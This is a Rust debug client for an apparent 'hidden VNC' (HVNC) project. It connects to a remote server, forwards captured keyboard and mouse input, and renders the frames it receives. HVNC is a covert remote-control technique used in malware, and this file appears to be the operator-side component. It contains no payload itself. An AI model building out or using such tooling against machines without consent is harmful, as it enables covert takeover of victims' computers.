use hidden_vnc::{
    common::{ClientConfig, InputEvent, MouseButton},
    client::{NetworkClient, DisplayManager, InputCapture},
    Result, HvncError,
};
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use log::{info, warn, error, debug};
use tokio::time::{Duration, sleep};
use minifb::{Window, WindowOptions, Key};

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();
    
    info!("🔍 HVNC Debug Input Client - Testing Input Capture");
    
    // Get server address from command line
    let args: Vec<String> = std::env::args().collect();
    let server_addr = if args.len() > 1 {
        args[1].clone()
    } else {
        "127.0.0.1:5900".to_string()
    };
    
    info!("🎯 Connecting to server: {}", server_addr);
    
    // Create network client
    let mut network_client = NetworkClient::new_with_config(
        Duration::from_secs(10),
        3,
        Duration::from_secs(2),
    );
    
    // Connect to server
    match network_client.connect(&server_addr).await {
        Ok(()) => info!("✅ Connected to server successfully"),
        Err(e) => {
            error!("❌ Failed to connect to server: {}", e);
            return Err(e);
        }
    }
    
    // Create display manager and input capture
    let config = ClientConfig::default();
    let mut display_manager = DisplayManager::new_with_settings(config, 1.0, true);
    let mut input_capture = InputCapture::new_with_settings(1.0);
    
    // Create a simple window for input testing
    info!("🖼️ Creating display window for input testing");
    display_manager.create_window(800, 600)?;
    
    // Update coordinate scale for input capture
    input_capture.update_coordinate_scale((800, 600), (1439, 654));
    
    let shutdown_signal = Arc::new(AtomicBool::new(false));
    let mut frame_count = 0;
    
    info!("🎮 Starting input capture loop. Click and type in the window!");
    info!("📏 Coordinate mapping: 800x600 client -> 1439x654 server");
    
    // Main loop
    while !shutdown_signal.load(Ordering::Relaxed) && display_manager.is_open() {
        frame_count += 1;
        
        // Process window events - inverted logic: process_events returns true when window should close
        if display_manager.process_events() {
            info!("🚪 Window closed by user");
            break;
        }
        
        // Capture input events
        if let Some(window) = display_manager.get_window() {
            let input_events = input_capture.capture_events(window);
            
            if !input_events.is_empty() {
                info!("🎮 Frame {}: Captured {} input events!", frame_count, input_events.len());
                
                for (i, event) in input_events.iter().enumerate() {
                    info!("  📝 Event {}: {:?}", i + 1, event);
                    
                    // Send the event to server
                    info!("  🚀 Sending event to server...");
                    match network_client.send_input(event.clone()).await {
                        Ok(()) => {
                            info!("  ✅ Event sent successfully to server");
                        }
                        Err(e) => {
                            error!("  ❌ Failed to send event to server: {}", e);
                        }
                    }
                }
            }
        }
        
        // Log input statistics every 60 frames (~1 second at 60fps)
        if frame_count % 60 == 0 {
            let stats = input_capture.get_input_stats();
            debug!("📊 Input Stats - Keys: {}, Mouse: {}, Scale: {:?}, Sensitivity: {:.2}, Has Mouse: {}", 
                  stats.pressed_keys_count, 
                  stats.pressed_mouse_buttons_count,
                  stats.coordinate_scale,
                  stats.mouse_sensitivity,
                  stats.has_mouse_position);
        }
        
        // Check for escape key to exit
        if let Some(window) = display_manager.get_window() {
            if window.is_key_down(Key::Escape) {
                info!("🔚 Escape key pressed, exiting...");
                break;
            }
        }
        
        // Try to receive frames from server (optional for this test)
        match network_client.receive_frame().await {
            Ok(frame_data) => {
                debug!("📺 Received frame from server: {} bytes", frame_data.len());
                if let Err(e) = display_manager.update_display(&frame_data) {
                    warn!("⚠️ Failed to update display: {}", e);
                }
            }
            Err(e) => {
                warn!("⚠️ Error receiving frame: {}", e);
            }
        }
        
        // Small delay to prevent excessive CPU usage
        sleep(Duration::from_millis(16)).await; // ~60 FPS
    }
    
    info!("🏁 Debug input client finished");
    Ok(())
}